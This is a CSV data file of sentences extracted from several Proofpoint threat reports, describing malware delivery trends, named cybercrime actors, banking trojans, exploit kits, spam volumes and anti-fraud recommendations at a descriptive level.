candidate_id,report_id,page,paragraph_id,sentence_id,text
CAND_00001,R001,1,R001_P0001,R001_S000001,proofpoint.com 12 MAY 2023
CAND_00002,R001,1,R001_P0002,R001_S000006,The changes began rolling out in 2022.
CAND_00003,R001,1,R001_P0002,R001_S000012,"• Some more sophisticated ecrime actors have the time and resources available to develop, iterate, and test different malware delivery techniques."
CAND_00004,R001,2,R001_P0002,R001_S000021,"Even in cases where no attribution is made, threats from a given campaign result from attacks perpetrated by the same threat actor."
CAND_00005,R001,2,R001_P0002,R001_S000024,"All instances of research in this report, including case studies, refer to proprietary Proofpoint processes and data unless otherwise noted."
CAND_00006,R001,2,R001_P0002,R001_S000027,"A Shift Begins Prior to 2022, Proofpoint observed macros were heavily favored by cybercriminal threat actors as initial access payloads."
CAND_00007,R001,3,R001_P0002,R001_S000039,"Shortcut (LNK) files were also initially favored as a technique from multiple ecrime threat actors beginning in mid-2022, with multiple actors classified as initial access brokers (IAB) pivoting to include LNK files in attack chains around the same time."
CAND_00008,R001,3,R001_P0003,R001_S000042,"Initially Proofpoint researchers hypothesized that threat actors would begin using XLL files as part of the overall TTP experimentation following macros, as this technique, while not popular, had been previously observed in threat data."
CAND_00009,R001,3,R001_P0003,R001_S000044,"Proofpoint has observed at least six large ecrime actors experiment with XLL files in malware delivery, and multiple unattributed threat clusters, but XLL files are used significantly less than other filetypes and have not experienced a notable uptick in use across the threat landscape."
CAND_00010,R001,3,R001_P0003,R001_S000046,"As detailed in the diagram above, few IAB actors were using LNK files in threat campaigns before April 2022, when four threat actors used them in attack chains delivering malware, including TA542 incorporating them to deliver Emotet."
CAND_00011,R001,4,R001_P0002,R001_S000053,"When the HTML attachment is opened, the web browser decodes the malicious script which is used to assemble the malware payload on the victim’s computer."
CAND_00012,R001,4,R001_P0002,R001_S000055,"However, since October 2022 it has been more frequently observed in campaigns associated with threats that are unattributed to a known actor."
CAND_00013,R001,4,R001_P0003,R001_S000056,Figure: Number of cybercriminal threat campaigns using HTML smuggling from June 2022 through March 2023.
CAND_00014,R001,5,R001_P0002,R001_S000065,TA570 was one of the first large cybercrime actors to use PDF attachments with URLs leading to a zipped password protected IMG file containing shortcut file ultimately leading to Qbot.
CAND_00015,R001,5,R001_P0002,R001_S000069,"Despite the parsing issue, the PDF contained an “OPEN” button with a hidden embedded URL making it easier for the victim to click the button."
CAND_00016,R001,5,R001_P0002,R001_S000071,0 5 10 15 20 25 30 35 40 45 50 Number of Campaigns Date Campaigns Using PDF in Attack Chains Unattributed TA866 TA581 TA580 TA578 TA577 TA570 TA551 TA544 TA4557 TA4000 TA2724 TA2721
CAND_00017,R001,6,R001_P0001,R001_S000072,CRIME FINDS A WAY: THE EVOLUTION AND EXPERIMENTATION OF THE CYBERCRIME ECOSYSTEM | THREAT REPORT
CAND_00018,R001,7,R001_P0003,R001_S000079,Figure: Malicious PDF file spoofing Adobe branding without parsing issue.
CAND_00019,R001,7,R001_P0003,R001_S000080,"OneNote Explosion One prominent example of the follow the leader phenomenon began in December 2022, when Proofpoint researchers first observed unattributed campaigns using OneNote documents to deliver malware, specifically AsyncRAT."
CAND_00020,R001,7,R001_P0003,R001_S000083,"By January 2023, Proofpoint threat researchers observed dozens of unattributed commodity malware campaigns using the same TTPs."
CAND_00021,R001,8,R001_P0002,R001_S000089,8 OneNote files more often than other IAB actors.
CAND_00022,R001,8,R001_P0003,R001_S000102,"When Proofpoint first began observing OneNote used for malware delivery, the team prioritized creating detections for the various attack chains observed, and by the time it was used by IAB actors, the TTPs had become less effective due to the rules in place."
CAND_00023,R001,9,R001_P0002,R001_S000112,"For the purposes of this report, Proofpoint considers IABs to be the groups who obtain initial access via first-stage malware payloads and may or may not work directly with ransomware threat actors."
CAND_00024,R001,9,R001_P0002,R001_S000114,"Case Study: TA570 TA570, also known as the Qbot “presidents” threat actor, is one of the most prolific cybercrime threat actors and Qbot affiliates tracked by Proofpoint."
CAND_00025,R001,9,R001_P0002,R001_S000115,It is considered to be an IAB and Proofpoint has associated TA570 campaigns with follow-on ransomware infections including Black Basta based on details in open source reporting.
CAND_00026,R001,9,R001_P0003,R001_S000120,"Observed filetypes included PDF, LNK, virtual 0 2 4 6 8 10 12 14 16 18 20 Number of Campaigns Date Example Techniques Used by TA570 HTML Smuggling ISO OneNote PDF Shortcut VBA Macro VHD WSF XL4 Macro XLL"
CAND_00027,R001,10,R001_P0002,R001_S000124,Variations on the attack chain for this actor can be illustrated in the variability of December 2022 campaigns.
CAND_00028,R001,10,R001_P0002,R001_S000125,"For example, Proofpoint observed the following six different attack chains delivering Qbot, all beginning with thread hijacked messages: • HTML Attachment → Password-Protected Zip → IMG → LNK → CMD → Qbot DLL • HTML Attachment → Password-Protected Zip → IMG → LNK → Qbot DLL • HTML Attachment → Password-Protected Zip → VHD → LNK → CMD → Qbot DLL • HTML Attachment → Password-Protected Zip → VHD → LNK → Qbot DLL • PDF Attachment → Actor-Controlled URL → Password-Protected Zip → ISO → WSF → Qbot DLL • PDF Attachment → Actor-Controlled URL → Password-Protected Zip → IMG → LNK → Qbot DLL TA570 was among the first observed by Proofpoint to repeatedly use HTML smuggling in campaigns beginning in mid-2022, as well as adopting PDFs for malware delivery in December 2022, which multiple other actors began using as well."
CAND_00029,R001,10,R001_P0002,R001_S000129,"Like TA570, TA577 regularly used both VBA macros and XL4 macros in campaigns prior to spring 2022."
CAND_00030,R001,10,R001_P0002,R001_S000131,TA577 typically delivers Qbot but has also been observed delivering IcedID and Ursnif since 2021.
CAND_00031,R001,10,R001_P0002,R001_S000134,Many of TA577’s changes align with similar attack chains used by TA570.
CAND_00032,R001,10,R001_P0002,R001_S000135,"In many campaigns, multiple filetypes are used, such as including shortcut files within ISOs."
CAND_00033,R001,11,R001_P0003,R001_S000139,Variations on the attack chain for this actor can be illustrated in the variability of February 2023 campaigns.
CAND_00034,R001,12,R001_P0001,R001_S000142,CRIME FINDS A WAY: THE EVOLUTION AND EXPERIMENTATION OF THE CYBERCRIME ECOSYSTEM | THREAT REPORT
CAND_00035,R001,12,R001_P0002,R001_S000144,"TA577 is among the most active cybercriminal threat actors tracked by Proofpoint with dynamic, frequently changing attack chains."
CAND_00036,R001,12,R001_P0002,R001_S000149,"Prior to 2022, threat actors delivering IcedID largely used macros to deliver malware, in addition to occasionally other methods such as URLs leading to zipped JavaScript payloads."
CAND_00037,R001,12,R001_P0002,R001_S000151,Figure: Example techniques used by threat actors delivering IcedID.
CAND_00038,R001,12,R001_P0002,R001_S000154,"Beginning in October 2022, many threat actors delivering IcedID began using HTML smuggling, which aligns with the popularity of this technique across the threat landscape in the fall of that year."
CAND_00039,R001,13,R001_P0002,R001_S000163,"Case Study: TA558 After using VBA macros consistently since 2019, TA558, a small crime threat actor targeting hospitality, hotel, and travel organizations, began using CHM and HTML smuggling in late 2022."
CAND_00040,R001,13,R001_P0002,R001_S000164,"TA558 has also experimented with other file types in attack chains such as RAR and ISO container files, JavaScript files, HTA attachments, WSF, and VBS files, and there was a clear trend of shifting away from macros and adopting new techniques for malware delivery."
CAND_00041,R001,14,R001_P0001,R001_S000168,CRIME FINDS A WAY: THE EVOLUTION AND EXPERIMENTATION OF THE CYBERCRIME ECOSYSTEM | THREAT REPORT
CAND_00042,R001,14,R001_P0002,R001_S000174,Over the last several years TA2541 has largely been consistent with their attack chains by leveraging URLs to various scripts and avoiding the use of Office macros.
CAND_00043,R001,14,R001_P0003,R001_S000182,The group uses Spanish- language lures to distribute a known – but infrequently used – RAT called Bandook.
CAND_00044,R001,14,R001_P0003,R001_S000184,"The attached PDF contains an embedded URL and password that, when clicked, leads to the download of a password protected compressed executable that contains Bandook."
CAND_00045,R001,15,R001_P0002,R001_S000187,15 The actor has used the same TTPs since Proofpoint first began tracking it in 2021.
CAND_00046,R001,15,R001_P0002,R001_S000189,"As other threat actors continue to experiment with TTPs, TA2721 remains consistent, with only occasional changes to the lure theme, PDF template, and password."
CAND_00047,R001,15,R001_P0003,R001_S000197,"ABOUT PROOFPOINT Proofpoint, Inc."
CAND_00048,R001,15,R001_P0003,R001_S000198,is a leading cybersecurity and compliance company that protects organizations’ greatest assets and biggest risks: their people.
CAND_00049,R001,15,R001_P0003,R001_S000201,More information is available at www.proofpoint.com.
CAND_00050,R001,15,R001_P0003,R001_S000206,Proofpoint.com
CAND_00051,R002,1,R002_P0001,R002_S000001,"The Proofpoint Threat Report explores threats, trends, and transformations that we see within our customer base and in the wider security marketplace."
CAND_00052,R002,2,R002_P0001,R002_S000006,"• The September pause in Dridex activity demonstrated the speed with which threat actors can adapt and change payloads, and delivery methods."
CAND_00053,R002,2,R002_P0001,R002_S000008,"In particular, the continued increase in phishing activity known as “Business Email Compromise” (BEC), also referred to as “wire transfer fraud,” reached a level sufficient to provoke a warning from the FBI about this threat."
CAND_00054,R002,2,R002_P0001,R002_S000011,"• Fraudulent social media account activity has become a major risk for organizations and individuals, as attackers aggressively embrace techniques for hijacking customer support conversations to steal personal and financial information."
CAND_00055,R002,2,R002_P0001,R002_S000016,• Update both email gateway rules and internal financial controls in order to improve resistance against wire transfer fraud scams.
CAND_00056,R002,3,R002_P0001,R002_S000019,Advanced Threats Proofpoint’s insight into advanced threat data on malware and campaigns in July-September demonstrate several clear trends over the quarter.
CAND_00057,R002,3,R002_P0001,R002_S000021,(Fig.
CAND_00058,R002,4,R002_P0001,R002_S000037,"Looking at the chart in Figure 3 above, it appears that the volumes of other payloads remained unaffected by the Dridex hiatus, but the relative volume of Dridex obscures variations in other payloads."
CAND_00059,R002,4,R002_P0001,R002_S000038,Charting the most common malware payloads as a percentage of total activity gives a better view.
CAND_00060,R002,4,R002_P0001,R002_S000040,"4) 0 500000 1000000 1500000 2000000 2500000 3000000 3500000 4000000 4/1/2015 5/1/2015 6/1/2015 7/1/2015 8/1/2015 9/1/2015 Dridex Dyre/Dyreza Upatre CryptoWall Vawtrak 8 7 6 5 4 3 2 1 Figure 3: Indexed weekly phishing document attachment malware volume, by payload, April-September 2015 0% 10% 20% 30% 40% 50% 60% 70% 80% 90% 100% 4/1/2015 5/1/2015 6/1/2015 7/1/2015 8/1/2015 9/1/2015 Vawtrak CryptoWall Upatre Dyre/Dyreza Dridex Figure 4: Weekly phishing document attachment malware payload as a percentage of total malware, April-September 2015"
CAND_00061,R002,5,R002_P0001,R002_S000043,"Even if their overall volume did not approach that of the Dridex campaigns, the sudden change in payload can represent a significant challenge for defenses that have adapted to months of Dridex payloads."
CAND_00062,R002,5,R002_P0001,R002_S000044,(Proofpoint and others noted that the Dridex campaigns resumed on October 1.
CAND_00063,R002,5,R002_P0001,R002_S000045,"We will look more closely at this renewed activity in the Threat Report for October-December.) Analysis of phishing malware payloads during the Dridex hiatus thus highlights several key traits: • Threat actors are adept at substituting one ecosystem component for another, and there are many options available to them at any given time."
CAND_00064,R002,5,R002_P0001,R002_S000047,• Malware is flexible: payloads that normally spread via one vector – such as CryptoWall via malvertising – can quickly ‘jump’ to other distribution vectors when the need and opportunity arise.
CAND_00065,R002,5,R002_P0001,R002_S000052,"As these threats show, attackers continue to employ increasingly sophisticated techniques against new targets in order to find and steal sensitive information."
CAND_00066,R002,5,R002_P0001,R002_S000055,"Moreover, a multi-layer approach is essential, with email security representing the logical starting point for an advanced threat defense: like this targeted attack, email remains the vector-of-choice for penetrating target organizations and delivering these sophisticated payloads."
CAND_00067,R002,6,R002_P0001,R002_S000059,5) This is a low-volume social engineering attack in which the simplicity and apparent legitimacy of the BEC phishing message are important factors.
CAND_00068,R002,6,R002_P0001,R002_S000060,The visible “From” line of the message often bears the name of the CEO or other high-ranking executive in the targeted organization.
CAND_00069,R002,6,R002_P0001,R002_S000061,"The message typically requests that the recipient immediately make a wire transfer to a third party, often with instructions to keep the request and transfer confidential."
CAND_00070,R002,6,R002_P0001,R002_S000067,"• Configure email gateway rules to flag inbound messages that spoof the organization’s domain, use Subject tagging for commonly used keywords such as “transfer”, and Display Name matching for commonly targeted recipients."
CAND_00071,R002,6,R002_P0001,R002_S000069,"• Tag the Subject line of all inbound email from the Internet with “EXTERNAL”, and reject all mail coming from an unresolvable domain in the envelope Sender field."
CAND_00072,R002,6,R002_P0001,R002_S000071,"Moreover, these controls should be out-of-band, requiring an in-person or telephone confirmation, rather than via email."
CAND_00073,R002,6,R002_P0001,R002_S000072,• Conduct culture training to all employees emphasizing that money transfers should never be carried out based solely on an email request.
CAND_00074,R002,6,R002_P0001,R002_S000074,"However, as Proofpoint research has shown, cybercriminals are capable of rapidly adapting to improved defenses and deploying new techniques and malware."
CAND_00075,R002,7,R002_P0001,R002_S000081,"7) 7/4/2015 7/11/2015 7/18/2015 7/25/2015 8/1/2015 8/8/2015 8/15/2015 8/22/2015 8/29/2015 9/5/2015 9/12/2015 9/19/2015 Exploit Kit Activity by Percent Share July-September 2015 other RIG Magnitude Nuclear Neutrino Angler Figure 7: Exploit kit activity by percent share, July-September 2015"
CAND_00076,R002,8,R002_P0001,R002_S000082,"Threat Report | July - September 2015 8 Exploit kits continued to update by integrating exploits targeting recently announced vulnerabilities, with the majority of exploits targeting Microsoft® platforms."
CAND_00077,R002,8,R002_P0001,R002_S000087,"• New “exploit kit” dubbed Spartan by Dell SecureWorks, which resembles a Nuclear Pack “detachable” flash."
CAND_00078,R002,8,R002_P0001,R002_S000091,Related reading: http://www.symantec.com/connect/blogs/sundown-exploit- kit-adds-internet-explorer-exploit-any-other-kit http://www.proofpoint.com/us/threat-insight/post/Light- After-Dark Figure 8: Xer (aka Sundown) exploit kit cpanel login page
CAND_00079,R002,9,R002_P0001,R002_S000092,Threat Report | July - September 2015 9 http://www.proofpoint.com/us/threat-insight/post/Hunter-Exploit-Kit-Targets-Brazilian-Banking-Customers Social Media One of the more alarming social media security trends that Proofpoint Nexgate researchers observed in Q3 was the use of fraudulent social media accounts of major brands to phish customer account credentials.
CAND_00080,R002,9,R002_P0001,R002_S000098,"For example, the fake name might be @MajorBank_ Help."
CAND_00081,R002,9,R002_P0001,R002_S000100,3.
CAND_00082,R002,9,R002_P0001,R002_S000105,It’s an example of how the detailed context provided by social media enables bad actors to craft highly effective attacks.
CAND_00083,R002,10,R002_P0001,R002_S000112,The daily message volume for the third quarter of 2015 follows.
CAND_00084,R002,10,R002_P0001,R002_S000114,"The calculation for the EU is based on the inclusion of all member states, thereby producing a better representation of its volume."
CAND_00085,R002,10,R002_P0001,R002_S000115,"At 25.75%, the EU generated the majority of the world’s spam."
CAND_00086,R002,10,R002_P0001,R002_S000117,Q3 2015 1 EU 25.75% 2 U.S.
CAND_00087,R002,10,R002_P0001,R002_S000119,Q3 2015 1 Germany 3.20% 2 Spain 2.34% 3 Romania 2.20% 4 Italy 1.94% 5 Bulgaria 1.34%
CAND_00088,R002,11,R002_P0001,R002_S000120,"Threat Report | July - September 2015 11 News and Trends Data breaches dominated the headlines in the information security world in Q3, with multiple high-profile breaches exposing not only highly sensitive personal information for up to 35 million individuals, but also details of several previously undisclosed zero-day exploits that quickly made their way into exploit kits and other threat actor tools."
CAND_00089,R002,11,R002_P0001,R002_S000125,com and stole private information.
CAND_00090,R002,11,R002_P0001,R002_S000126,Lawsuits involving hundreds of millions of dollars were filed in the wake of users’ private information having been publicly disclosed.
CAND_00091,R002,11,R002_P0001,R002_S000127,"Read more: http://www.theguardian.com/technology/2015/aug/22/adultery-website-ashley-madison-faces-578m-class- action-over-data-breach Hacking Team data breach discloses zero-day exploits The tables turned for notorious Italian cybersecurity firm Hacking Team, who were victimized by a hack."
CAND_00092,R002,11,R002_P0001,R002_S000128,"Hacking Team sells intrusion and surveillance technology to national governments and law enforcement agencies, which then allows them to access the computers of persons of interest."
CAND_00093,R002,11,R002_P0001,R002_S000133,This data will likely enable the continued growth of fraudulent tax returns next year.
CAND_00094,R002,11,R002_P0001,R002_S000135,"CISA would protect businesses that share this information with each other, and with government agencies."
CAND_00095,R002,12,R002_P0001,R002_S000138,"Threats analyzed: Phishing http://www.proofpoint.com/us/threat-insight/post/What-Are-Users-Clicking-On “Fleurs du malware”: Phishing campaigners fill their nets in France (July 13, 2015) Malicious macro phishing campaigns aggressively targeted France for the entire month of July, and this analysis looks at the techniques they used to spread Dridex and other banking Trojans."
CAND_00096,R002,12,R002_P0001,R002_S000139,"Threats analyzed: Dridex, phishing, malicious macros http://www.proofpoint.com/us/threat-insight/post/Fleurs-du-malware “The Missing .LNK: Dridex Actor Tries New File Format” (July 29, 2015) Dridex campaigners continue to experiment with file formats and other techniques to evade detection, in this case resurrecting link (LNK) files."
CAND_00097,R002,12,R002_P0001,R002_S000140,"Threats analyzed: Dridex Banking Trojan, Phishing, Attachments https://www.proofpoint.com/us/threat-insight/post/The-Missing-LNK “Dead phish bounce: Alerting to brand risk with email backscatter” (August 6, 2015) A quick look at how organizations can use email “bounce” messages to become aware of phishing campaigns that leverage their domains and brands."
CAND_00098,R002,12,R002_P0001,R002_S000146,"Threats analyzed: Angler EK, Ransomware, Malvertising, Magnitude Exploit Kit (EK) https://www.proofpoint.com/us/threat-insight/post/Too-Many-Crooks-in-the-Kitchen"
CAND_00099,R002,13,R002_P0001,R002_S000155,"Threats analyzed: Operation Arid Viper, Targeted Attacks, APT, Phishing https://www.proofpoint.com/us/threat-insight/post/Operation-Arid-Viper-Slithers-Back-Into-View “Meet GreenDispenser: A new breed of ATM malware” (September 24, 2015) First analysis of a new variety of ATM malware that uses novel techniques to give attackers the ability to drain infected ATMs of their cash."
CAND_00100,R002,13,R002_P0001,R002_S000157,"Threats analyzed: Dyreza/Dyre, Banking Trojans, MITB Attacks, Phishing, Credential Theft https://www.proofpoint.com/us/threat-insight/post/Dyreza-Campaigners-Sights-On-Fulfillment-Warehousing-Industry"
CAND_00101,R003,3,R003_P0002,R003_S000013,5 Email-Based Threat Trends.....................................................................................................................................................
CAND_00102,R003,3,R003_P0002,R003_S000016,8 Sidebar: Coinminer Mania......................................................................................................................................................
CAND_00103,R003,4,R003_P0001,R003_S000029,"For every “defensive” registration from organizations acting proactively, we found twenty suspicious lookalike registrations by someone else."
CAND_00104,R003,4,R003_P0001,R003_S000032,The upsurge amplified a trend we saw in first half of the year—volumes marked the highest proportion of URL email (vs.
CAND_00105,R003,4,R003_P0001,R003_S000035,Ransomware remained the top malware category.
CAND_00106,R003,4,R003_P0001,R003_S000038,It accounted for almost 55% of total message volume and more than 86% of all ransomware volume.
CAND_00107,R003,4,R003_P0001,R003_S000044,It used a leaked exploit from the U.S.
CAND_00108,R003,4,R003_P0001,R003_S000045,National Security Agency known as ETERNALBLUE to spread across internal networks.
CAND_00109,R003,4,R003_P0001,R003_S000055,"BANKING TROJANS This type of malware steals victims’ bank login credentials, usually by redirecting the victim’s browser to a fake version of their bank’s website or injecting fake login forms into the real site."
CAND_00110,R003,4,R003_P0001,R003_S000059,"EXPLOIT KITS (EKS) Exploit kits (EKs) run on the web, detecting and exploiting vulnerabilities in computers that connect to it."
CAND_00111,R003,5,R003_P0001,R003_S000063,Defensive registration of brand-owned domains fell 20% vs.
CAND_00112,R003,5,R003_P0001,R003_S000064,the year-ago period.
CAND_00113,R003,5,R003_P0001,R003_S000065,Suspicious domain registrations grew 20%.
CAND_00114,R003,5,R003_P0001,R003_S000072,"That surge helped push overall malicious email volume up 85% from the earlier quarter, despite a 74% drop in emails with malicious attachments."
CAND_00115,R003,5,R003_P0001,R003_S000073,"Still, malicious attachments remain a significant part of mix."
CAND_00116,R003,5,R003_P0001,R003_S000076,"When executed, the scripts downloaded and installed LOCKY ransomware."
CAND_00117,R003,5,R003_P0001,R003_S000083,"ANGLER PHISHING In angler phishing, attackers create fake customer-support accounts on social media to trick people looking for help into visiting a phishing site or providing account credentials."
CAND_00118,R003,5,R003_P0001,R003_S000084,DEFENSIVE REGISTRATIONS The recommended practice of buying up internet domains that could be mistaken for yours before attackers do.
CAND_00119,R003,6,R003_P0001,R003_S000087,A handful of large campaigns distributing THE TRICK banking Trojan created some spikes later in the quarter.
CAND_00120,R003,6,R003_P0001,R003_S000090,"Other Malware July August September Ransomware Totals Banking Trojan Totals Other Malware Totals THE TRICK The Trick, also known as Trickbot, is a banking Trojan closely related to Dyre."
CAND_00121,R003,7,R003_P0001,R003_S000092,Quarterly Threat Report | Q3 2017 7 BANKING TROJANS: NEW TRENDS FOR OLD PLAYERS Key stat: The Trick accounted for 70% of all emails sending banking Trojans.
CAND_00122,R003,7,R003_P0001,R003_S000095,"At the same time, ZLOADER activity held steady through much of the quarter, though at lower levels from Q2."
CAND_00123,R003,7,R003_P0001,R003_S000102,Figure 4 shows the daily mix of banking Trojans.
CAND_00124,R003,7,R003_P0001,R003_S000103,"Traffic spikes from The Trick punctuate the quarter, dwarfing smaller bumps mostly from Zloader and Panda Banker."
CAND_00125,R003,7,R003_P0001,R003_S000104,"Top Banking Trojans Indexed Daily Message Volume Trend, Q3 2017 Figure 4: Indexed daily message volumes for top banking Trojan strains, July-September 2017 July August September The Trick Banking UrlZone Banking Dridex Banking Ursnif Banking Zloader Banking Retefe Banking Corebot Banking Panda Banking Bancos Banking DRIDEX Dridex is a widely used banking Trojan that spreads through a variety of vectors, primarily via email, infecting victims and stealing banking credentials."
CAND_00126,R003,7,R003_P0001,R003_S000105,"ZLOADER Zloader, also known as Terdot, is a downloader often used with the Zbot banking Trojan and other malware variants."
CAND_00127,R003,7,R003_P0001,R003_S000108,"WANNACRY The ransomware infected tens of thousands of systems across more than 150 countries in May, one the largest cyber attacks on record."
CAND_00128,R003,7,R003_P0001,R003_S000109,It spread through a flaw in a file-sharing component of Microsoft Windows.
CAND_00129,R003,8,R003_P0001,R003_S000122,Hell (discovered in July) and IsraByte (discovered in August) failed to gain traction or publicity.
CAND_00130,R003,8,R003_P0001,R003_S000129,NOTPETYA This strain of malware masqueraded as Petya ransomware but appears to be a state-sponsored tool to cause turmoil rather than collect a ransom.
CAND_00131,R003,9,R003_P0003,R003_S000135,"The decrease is likely due to a drop in large numbers of “minor project,” proof-of- concept, experimental, and “script kiddie” ransomware strains that helped inflate earlier totals."
CAND_00132,R003,10,R003_P0001,R003_S000148,"It compares Q3 2017, Q2 2017, and the year-ago quarter—all of which revealed similar relationships."
CAND_00133,R003,10,R003_P0002,R003_S000151,Some domain spoofing uses lookalike domain names deceptively similar to the real ones.
CAND_00134,R003,10,R003_P0002,R003_S000161,The Pirate Bay recently made headlines by using visitors’ CPU cycles to mine Monero currency.
CAND_00135,R003,10,R003_P0002,R003_S000166,"Regardless of what methods they use, threat actors will likely explore new means of exploiting victim PCs to mine."
CAND_00136,R003,10,R003_P0002,R003_S000168,Threat actors have revealed time and again their willingness to “follow the money.”
CAND_00137,R003,11,R003_P0001,R003_S000178,"One | One One | Some One | Many Some | One Some | Some Some | Many Many | One Many | Some Many | Many Identities Spoofed by Number of Staff Targeted, Q3 2017 vs."
CAND_00138,R003,11,R003_P0001,R003_S000180,number of people targeted.
CAND_00139,R003,11,R003_P0001,R003_S000189,"But we are seeing increased activity from “traffers,” networks designed to drive traffic to exploit kit landing pages."
CAND_00140,R003,11,R003_P0001,R003_S000193,"Even Neutrino, which vied with RIG for the top spot for a few periods in the quarter had given way almost entirely to RIG by the end."
CAND_00141,R003,12,R003_P0001,R003_S000198,"Quarterly Threat Report | Q3 2017 12 Figure 10: Top exploit kit traffic as percentage of total, April-May 2017 Exploit Kit Activity—Share of Samples Collected Q3 2017 0% 10% 20% 30% 40% 50% 60% 70% 80% 90% 100% RIG Neutrino Angler Magnitude Nuclear Sundown July August September DOMAIN TRENDS Key stat: Suspicious domain registrations outnumbered defensive registrations 20 to 1, widening the gap between companies looking to protect their brand and attackers looking to exploit it."
CAND_00142,R003,12,R003_P0001,R003_S000202,"From January through August 2017, suspicious domain registrations rose 20% vs."
CAND_00143,R003,12,R003_P0001,R003_S000203,the year-ago period as brand-owned defensive registrations fell 20%.
CAND_00144,R003,12,R003_P0001,R003_S000204,"Even with these defensive registrations, suspicious domains have historically far outpaced brand- owned domains."
CAND_00145,R003,12,R003_P0001,R003_S000207,"Moreover, spikes in defensive registrations are usually tied to a major event related to the brand, such as a new product launch, rather than an ongoing defense."
CAND_00146,R003,13,R003_P0001,R003_S000216,Standard credential phishing through social media may be easier.
CAND_00147,R003,14,R003_P0001,R003_S000219,Quarterly Threat Report | Q3 2017 14 RECOMMENDATIONS This report provides insight into the shifting threat landscape that can inform your cybersecurity strategy.
CAND_00148,R003,14,R003_P0001,R003_S000220,"Here are our top recommendations for how you can protect your data, people, and brand in the coming months."
CAND_00149,R003,14,R003_P0002,R003_S000227,"For email attacks that use lookalike domains, your solution should be able to find domains that could be mistaken for yours—and work with third-party services to take them down."
CAND_00150,R003,16,R003_P0001,R003_S000244,"Leading organizations of all sizes, including over 50 percent of the Fortune 100, rely on Proofpoint solutions, which are built for today’s mobile and social-enabled IT environments and leverage both the power of the cloud and a big-data-driven analytics platform to combat modern advanced threats."
CAND_00151,R004,1,R004_P0002,R004_S000001,threat protection | compliance | archiving & governance | secure communication THREAT REPORT 6
CAND_00152,R004,1,R004_P0003,R004_S000004,This month we turn our focus back to specific threat models.
CAND_00153,R004,1,R004_P0003,R004_S000005,Hiding Malware Inside SSL Attackers have been relying on a number of techniques to infect users.
CAND_00154,R004,1,R004_P0003,R004_S000008,One way attackers are keeping things simple is by using Dropbox to host the malware.
CAND_00155,R004,1,R004_P0003,R004_S000010,"The cloud makes life easier for everyone, including the bad guys."
CAND_00156,R004,1,R004_P0004,R004_S000012,Proofpoint Threat Report
CAND_00157,R004,2,R004_P0001,R004_S000013,"©2013 Proofpoint, Inc."
CAND_00158,R004,2,R004_P0001,R004_S000014,"Proofpoint is a trademark of Proofpoint, Inc."
CAND_00159,R004,2,R004_P0002,R004_S000018,(Note: The XXXXs are added to de-fang the URL) What is interesting about this URL is that it uses https:// (SSL) to encrypt the transaction.
CAND_00160,R004,2,R004_P0002,R004_S000019,"Some sandboxes are completely blind to this malware, as most cannot decrypt the SSL traffic."
CAND_00161,R004,2,R004_P0002,R004_S000022,"Proofpoint’s Targeted Attack Protection examines the email message, the application layer, instead of the network traffic and has full visibility."
CAND_00162,R004,2,R004_P0002,R004_S000024,Match the Hatch Fly fishing aficionados recognize the wisdom in the phrase “Match the Hatch”.
CAND_00163,R004,3,R004_P0002,R004_S000032,The second lure clearly “matched the hatch”.
CAND_00164,R004,3,R004_P0002,R004_S000036,Threat News Phishing Emails Using Google Docs Lures The SANS Institutes ISC (Internet Storm Center) issued a warning on a scam using Google Docs as the phishing bait.
CAND_00165,R004,3,R004_P0002,R004_S000037,The lure email contains a link to a bogus web email provider in what turns out to be a credential phish.
CAND_00166,R004,3,R004_P0002,R004_S000038,Details can be found here: http://www.spamfighter.com/News-18688-ISC-Warns- Phishing-Emails-Abusing-Google-Docs-Circulating-on-Internet.htm What Can You Learn from Others Data Breaches?
CAND_00167,R004,3,R004_P0002,R004_S000040,Keeping systems patched is paramount.
CAND_00168,R004,4,R004_P0001,R004_S000044,"©2013 Proofpoint, Inc."
CAND_00169,R004,4,R004_P0001,R004_S000048,"Details of their findings are enumerated in the following blog post, https://blog.commtouch.com/cafe/miscellaneous/343927-new-malicious-sites-commtouch-security- number-of-the-month-for-november Threat Insight Blog This month we introduce a new section, Threat Insight Blog."
CAND_00170,R004,4,R004_P0001,R004_S000049,"Interesting posts from Proofpoint’s new threat blog, Threat Insight, will be highlighted."
CAND_00171,R004,4,R004_P0001,R004_S000051,"Malware Campaign that Says “Whatsapp” Goes Nuclear For many weeks now we’ve been seeing a targeted malware campaign that uses the WhatsApp brand, a mobile instant messaging application, as the lure for its malware campaign."
CAND_00172,R004,4,R004_P0001,R004_S000052,"The reason this campaign stood out is due to its use of the Nuclear Exploit Kit, a GeoIP database to do some interesting customizations and some variance in the way the user machine was attacked."
CAND_00173,R004,4,R004_P0001,R004_S000054,Some of the most effective malware campaigns we’ve seen have been those that use eCommerce- related themes such as “order confirmations” or “shipping confirmations” from well-known retailers.
CAND_00174,R004,4,R004_P0001,R004_S000055,"Given the holiday season and Christmas shopping, we decided to take a look back at some campaigns we observed in 2013 as we expect the number of these attacks to increase over the next 6 weeks across all regions including North America, Europe, and Asia."
CAND_00175,R004,4,R004_P0001,R004_S000056,"Full details are here, http://www.proofpoint.com/threatinsight/posts/holiday-shopping-season-equal- more-threat-campaigns-but-will-users-click.php"
CAND_00176,R004,5,R004_P0001,R004_S000060,"Our research team looked through the last 90 days of all the millions of URLs we have found to be malicious in our sandbox, and extracted the ones that seemed related to healthcare."
CAND_00177,R004,5,R004_P0001,R004_S000063,Websites with domains like “accesshealthsystems.com” and “advancemedicals.com” feature among these.
CAND_00178,R004,5,R004_P0001,R004_S000064,"The full post can be found at, http://www.proofpoint.com/threatinsight/posts/healthcare-reform-also- driving-up-watering-hole-attacks.php Threat Trends Spam Volume Trends Proofpoint tracks spam volumes via a system of honeypots."
CAND_00179,R004,5,R004_P0001,R004_S000065,The volumes historically track with that of our customer base.
CAND_00180,R004,5,R004_P0001,R004_S000069,"Additionally, lower day to day spam volumes were experienced in November."
CAND_00181,R004,5,R004_P0001,R004_S000070,"For example volumes on October 30 checked in at 9,209,685 compared to November 30 where only 4,373,549 spam messages were recorded, a 52% decrease."
CAND_00182,R004,6,R004_P0001,R004_S000072,"©2013 Proofpoint, Inc."
CAND_00183,R004,6,R004_P0001,R004_S000073,"Proofpoint is a trademark of Proofpoint, Inc."
CAND_00184,R004,6,R004_P0001,R004_S000074,THREAT REPORT [6] Spam volumes decreased again month over month in November by a substantial 38.17%.
CAND_00185,R004,6,R004_P0001,R004_S000075,A third straight monthly decrease in volumes and a 58.53% decrease over three months.
CAND_00186,R004,6,R004_P0001,R004_S000076,This downward trend has given back most of the previously reported increase.
